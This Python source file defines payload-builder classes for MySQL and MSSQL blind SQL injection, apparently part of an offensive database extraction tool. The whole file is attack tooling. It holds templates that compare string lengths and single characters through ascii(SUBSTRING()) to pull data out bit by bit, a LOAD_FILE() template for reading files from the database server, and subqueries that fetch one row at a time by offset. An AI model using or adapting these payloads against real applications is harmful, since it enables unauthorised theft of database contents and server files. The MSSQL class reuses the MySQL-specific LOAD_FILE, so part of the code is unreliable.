class MysqlPayloads:

    def __init__(self, prefix='', space=' '):
        self.prefix = prefix
        self.space = space

        self.and_size_eq = self.prefix + self.space + "LENGTH({})={}"
        self.and_size_lt = self.prefix + self.space + "LENGTH({})<{}"
        self.and_size_gt = self.prefix + self.space + "LENGTH({})>{}"

        self.and_char_at_is = self.prefix + self.space + "ascii(SUBSTRING({},{},1))={}"
        self.and_char_at_lt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))<{}"
        self.and_char_at_gt = self.prefix + self.space + "ascii(SUBSTRING({},{},1))>{}"

        self.str_file = "(LOAD_FILE({}))"

    def one_line_query(self, column, table, where='', offset=0):
        return "(SELECT{0}{1}{0}from{0}{2}{0}{3}{0}LIMIT{0}1{0}OFFSET{0}{4})".format(self.space, column, table, where, offset)


class MssqlPayloads:

    def __init__(self, prefix=''):
        self.prefix = prefix

        self.and_size_eq = self.prefix + " LEN({}) = {}"
        self.and_size_lt = self.prefix + " LEN({}) < {}"
        self.and_size_gt = self.prefix + " LEN({}) > {}"

        self.and_char_at_is = self.prefix + " ascii(SUBSTRING({}, {},1)) = {}"
        self.and_char_at_lt = self.prefix + " ascii(SUBSTRING({}, {},1)) < {}"
        self.and_char_at_gt = self.prefix + " ascii(SUBSTRING({}, {},1)) > {}"

        self.str_file = "(LOAD_FILE({}))"

    def one_line_query(self, column, table, where='', offset=0):
        return "(SELECT TOP 1 {} FROM (SELECT TOP {} {} from {} {} ORDER BY {} DESC) a ORDER BY {})".format(column, offset + 1, column, table, where, column, column)
